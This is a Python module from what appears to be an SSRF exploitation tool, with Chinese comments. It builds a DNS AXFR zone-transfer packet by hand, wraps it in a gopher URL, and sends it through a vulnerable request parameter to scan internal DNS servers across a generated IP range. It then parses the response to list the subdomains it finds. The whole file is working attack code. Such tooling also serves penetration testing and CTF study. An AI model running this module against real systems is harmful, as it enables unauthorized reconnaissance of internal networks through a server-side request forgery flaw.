import binascii
import logging
from urllib.parse import quote

from core.utils import gen_ip_list, wrapper_gopher

name = "axfr"
description = "DNS AXFR 区域传送"
author = "Swissky"
documentation = [
    "https://vozec.fr/writeups/pong-fcsc2024-en/",
    "https://mizu.re/post/pong",
    "https://gist.github.com/Siss3l/32591a6d6f33f78bb300bfef241de262",
]


class exploit:
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "53"
    SERVER_DOMAIN = "example.lab"

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")

        # 处理自定义 DNS 目标参数
        if args.lhost is not None:
            self.SERVER_HOST = args.lhost
        if args.lport is not None:
            self.SERVER_PORT = args.lport
        if args.ldomain is not None:
            self.SERVER_DOMAIN = args.ldomain

        # 使用生成器创建主机列表
        gen_host = gen_ip_list(self.SERVER_HOST, args.level)
        for ip in gen_host:
            domain, tld = self.SERVER_DOMAIN.split(".")

            # DNS AXFR - TCP 报文格式
            dns_request = b"\x01\x03\x03\x07"  # BITMAP
            dns_request += b"\x00\x01"  # QCOUNT
            dns_request += b"\x00\x00"  # ANCOUNT
            dns_request += b"\x00\x00"  # NSCOUNT
            dns_request += b"\x00\x00"  # ARCOUNT

            dns_request += len(domain).to_bytes()  # LEN DOMAIN
            dns_request += domain.encode()  # DOMAIN
            dns_request += len(tld).to_bytes()  # LEN TLD
            dns_request += tld.encode()  # TLD
            dns_request += b"\x00"  # DNAME EOF

            dns_request += b"\x00\xfc"  # QTYPE AXFR (252)
            dns_request += b"\x00\x01"  # QCLASS IN (1)
            dns_request = len(dns_request).to_bytes(2, byteorder="big") + dns_request

            payload = wrapper_gopher(quote(dns_request), ip, self.SERVER_PORT)

            # 发送 payload
            r = requester.do_request(args.param, payload)
            self.parse_output(r.text)

    def parse_output(self, data):
        # 去掉头部部分
        lheader = len(b"\x00" + b"\x6a" + b"\x01\x03" + b"\xef\xbf\xbd" + b"\xef\xbf\xbd" + b"\x00")
        lother = len(b"\x01\x00" + b"\x03" + b"\x00\x00\x00\x00")
        hex_output = binascii.hexlify(data.encode())
        hex_output = hex_output[(lheader + lother) * 2 :]
        data = binascii.unhexlify(hex_output)

        # 提取长度
        domain_size = data[0]
        domain = data[1 : domain_size + 1]
        logging.debug(f"DOMAIN（域名）: {domain_size}, {domain.decode()}")

        tld_size = data[domain_size + 1]
        tld = data[domain_size + 2 : domain_size + 2 + tld_size]
        logging.debug(f"TLD（顶级域）: {tld_size}, {tld.decode()}")

        # 子域名
        subdata = data[domain_size + 2 + tld_size :]
        subdata_arr = subdata.decode().split("�")
        for sub in subdata_arr:
            printable = self.bytes_to_printable_string(sub.encode())
            if printable != "":
                logging.info(f"\033[32m发现子域名\033[0m : {printable}")

    def bytes_to_printable_string(self, byte_string):
        # 过滤不可打印字符并解码字节串
        printable_chars = (chr(byte) for byte in byte_string if chr(byte).isprintable())
        # 将可打印字符合并为单个字符串
        printable_string = "".join(printable_chars)
        return printable_string
